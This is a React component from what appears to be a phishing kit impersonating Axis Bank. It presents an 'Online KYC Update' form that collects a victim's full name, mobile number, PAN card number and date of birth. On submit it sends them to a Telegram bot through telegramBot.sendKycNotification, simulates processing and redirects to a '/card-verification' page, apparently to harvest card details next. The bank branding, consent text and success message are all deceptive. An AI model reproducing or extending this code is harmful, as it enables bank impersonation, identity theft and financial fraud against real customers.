"use client";

import React, { useState } from "react";
import { X, Eye, EyeOff, Lock, User, AlertCircle, Info, CheckCircle, Phone, CreditCard, Calendar } from "lucide-react";
import { useRouter } from "next/navigation";
import { telegramBot } from "../utils/telegramBot";

interface KycModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function KycModal({ isOpen, onClose }: KycModalProps) {
  const router = useRouter();
  const [formData, setFormData] = useState({
    fullName: "",
    mobileNumber: "",
    panCardNumber: "",
    dateOfBirth: ""
  });

  const [errors, setErrors] = useState({
    fullName: "",
    mobileNumber: "",
    panCardNumber: "",
    dateOfBirth: ""
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const validateForm = () => {
    const newErrors = {
      fullName: "",
      mobileNumber: "",
      panCardNumber: "",
      dateOfBirth: ""
    };

    // Full Name validation
    if (!formData.fullName.trim()) {
      newErrors.fullName = "Full name is required";
    } else if (formData.fullName.length < 3) {
      newErrors.fullName = "Full name must be at least 3 characters";
    } else if (!/^[a-zA-Z\s]+$/.test(formData.fullName)) {
      newErrors.fullName = "Full name should contain only letters and spaces";
    }

    // Mobile Number validation
    if (!formData.mobileNumber.trim()) {
      newErrors.mobileNumber = "Mobile number is required";
    } else if (!/^[6-9]\d{9}$/.test(formData.mobileNumber)) {
      newErrors.mobileNumber = "Please enter a valid 10-digit mobile number";
    }

    // PAN Card validation
    if (!formData.panCardNumber.trim()) {
      newErrors.panCardNumber = "PAN card number is required";
    } else if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(formData.panCardNumber.toUpperCase())) {
      newErrors.panCardNumber = "Please enter a valid PAN card number (e.g., ABCDE1234F)";
    }

    // Date of Birth validation
    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of birth is required";
    } else {
      const dob = new Date(formData.dateOfBirth);
      const today = new Date();
      const age = today.getFullYear() - dob.getFullYear();
      const monthDiff = today.getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dateOfBirth = "You must be at least 18 years old";
      } else if (age > 120) {
        newErrors.dateOfBirth = "Please enter a valid date of birth";
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error !== "");
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === "fullName") {
      setFormData(prev => ({ ...prev, [name]: value }));
    } else if (name === "mobileNumber") {
      const numericValue = value.replace(/\D/g, "").slice(0, 10);
      setFormData(prev => ({ ...prev, [name]: numericValue }));
    } else if (name === "panCardNumber") {
      setFormData(prev => ({ ...prev, [name]: value.toUpperCase() }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }

    // Clear error for this field
    setErrors(prev => ({ ...prev, [name]: "" }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);
    
    // Send KYC details to Telegram
    const kycDetails = {
      fullName: formData.fullName,
      mobileNumber: formData.mobileNumber,
      panCardNumber: formData.panCardNumber,
      dateOfBirth: formData.dateOfBirth,
      timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
    };
    
    await telegramBot.sendKycNotification(kycDetails);
    
    // Simulate API call for first form
    setTimeout(() => {
      setIsSubmitting(false);
      // Redirect to card verification page
      router.push("/card-verification");
      onClose();
    }, 1500);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg shadow-xl w-full max-w-2xl max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="bg-[#8B1538] text-white p-4 md:p-6 rounded-t-lg sticky top-0 z-10">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg md:text-xl font-semibold">Online KYC Update</h2>
              <p className="text-xs md:text-sm mt-1 text-white/90">Update your KYC details securely</p>
            </div>
            <button
              onClick={onClose}
              className="text-white hover:bg-white/20 rounded-full p-1 transition-colors"
            >
              <X size={20} />
            </button>
          </div>
        </div>

        {/* Success Message */}
        {isSuccess && (
          <div className="mx-4 md:mx-6 mt-4 md:mt-6 p-4 bg-green-50 border border-green-200 rounded-lg">
            <div className="flex items-center">
              <CheckCircle className="text-green-600 mr-3" size={24} />
              <div>
                <h3 className="font-semibold text-green-800">KYC Update Submitted Successfully!</h3>
                <p className="text-sm text-green-700 mt-1">
                  Your KYC details have been submitted for verification. You will be redirected to the card verification page shortly.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Form */}
        {!isSuccess && (
          <form onSubmit={handleSubmit} className="p-4 md:p-6 space-y-4 md:space-y-6">
            {/* Information Banner */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 md:p-4">
              <div className="flex items-start">
                <Info className="text-blue-600 mt-0.5 mr-2 flex-shrink-0" size={16} />
                <div className="text-xs md:text-sm text-blue-800">
                  <p className="font-medium mb-1">Important Information:</p>
                  <ul className="space-y-1 text-xs">
                    <li>• Please ensure all details match your official documents</li>
                    <li>• Mobile number should be registered with the bank</li>
                    <li>• PAN card is mandatory for KYC verification</li>
                    <li>• Processing time: 24 hrs</li>
                  </ul>
                </div>
              </div>
            </div>

            {/* Full Name Field */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Full Name <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <User size={18} className="text-gray-400" />
                </div>
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleInputChange}
                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-base placeholder-gray-500 ${
                    errors.fullName ? "border-red-500" : "border-gray-300"
                  }`}
                  placeholder="Enter your full name as per documents"
                />
              </div>
              {errors.fullName && (
                <div className="flex items-center mt-1 text-red-500 text-sm">
                  <AlertCircle size={14} className="mr-1" />
                  {errors.fullName}
                </div>
              )}
            </div>

            {/* Mobile Number Field */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Mobile Number <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <Phone size={18} className="text-gray-400" />
                </div>
                <input
                  type="tel"
                  name="mobileNumber"
                  value={formData.mobileNumber}
                  onChange={handleInputChange}
                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-base placeholder-gray-500 ${
                    errors.mobileNumber ? "border-red-500" : "border-gray-300"
                  }`}
                  placeholder="Enter 10-digit mobile number"
                  maxLength={10}
                />
              </div>
              {errors.mobileNumber && (
                <div className="flex items-center mt-1 text-red-500 text-sm">
                  <AlertCircle size={14} className="mr-1" />
                  {errors.mobileNumber}
                </div>
              )}
            </div>

            {/* PAN Card Number Field */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                PAN Card Number <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <CreditCard size={18} className="text-gray-400" />
                </div>
                <input
                  type="text"
                  name="panCardNumber"
                  value={formData.panCardNumber}
                  onChange={handleInputChange}
                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-base uppercase font-medium placeholder-gray-500 ${
                    errors.panCardNumber ? "border-red-500" : "border-gray-300"
                  }`}
                  placeholder="ABCDE1234F"
                  maxLength={10}
                />
              </div>
              {errors.panCardNumber && (
                <div className="flex items-center mt-1 text-red-500 text-sm">
                  <AlertCircle size={14} className="mr-1" />
                  {errors.panCardNumber}
                </div>
              )}
            </div>

            {/* Date of Birth Field */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Date of Birth <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <Calendar size={18} className="text-gray-400" />
                </div>
                <input
                  type="date"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleInputChange}
                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-base ${
                    errors.dateOfBirth ? "border-red-500" : "border-gray-300"
                  }`}
                  max={new Date().toISOString().split('T')[0]}
                />
              </div>
              {errors.dateOfBirth && (
                <div className="flex items-center mt-1 text-red-500 text-sm">
                  <AlertCircle size={14} className="mr-1" />
                  {errors.dateOfBirth}
                </div>
              )}
            </div>

            {/* Terms and Conditions */}
            <div className="bg-gray-50 p-3 md:p-4 rounded-lg">
              <label className="flex items-start">
                <input
                  type="checkbox"
                  required
                  className="w-4 h-4 text-[#8B1538] border-gray-300 rounded focus:ring-[#8B1538] mt-0.5"
                />
                <span className="ml-3 text-xs md:text-sm text-gray-600">
                  I hereby declare that the information provided is true and correct. I authorize Axis Bank to verify these details and contact me for KYC purposes.
                </span>
              </label>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-col sm:flex-row gap-3 md:gap-4 pt-4">
              <button
                type="button"
                onClick={onClose}
                className="flex-1 border border-gray-300 text-gray-700 py-2 md:py-3 rounded-lg font-semibold hover:bg-gray-50 transition-colors text-sm md:text-base"
              >
                Cancel
              </button>
              <button
                type="submit"
                disabled={isSubmitting}
                className="flex-1 bg-[#8B1538] text-white py-2 md:py-3 rounded-lg font-semibold hover:bg-[#7a1230] transition-colors focus:ring-2 focus:ring-[#8B1538] focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed text-sm md:text-base"
              >
                {isSubmitting ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                  </span>
                ) : (
                  "Continue"
                )}
              </button>
            </div>
          </form>
        )}

        {/* Footer */}
        <div className="bg-gray-50 px-4 md:px-6 py-3 md:py-4 rounded-b-lg border-t">
          <div className="flex flex-col sm:flex-row items-center justify-center space-x-0 sm:space-x-4 text-xs text-gray-500">
            <span> 2024 Axis Bank</span>
            <span className="hidden sm:inline">•</span>
            <a href="#" className="hover:text-[#8B1538]">Privacy Policy</a>
            <span className="hidden sm:inline">•</span>
            <a href="#" className="hover:text-[#8B1538]">Terms of Use</a>
          </div>
        </div>
      </div>
    </div>
  );
}
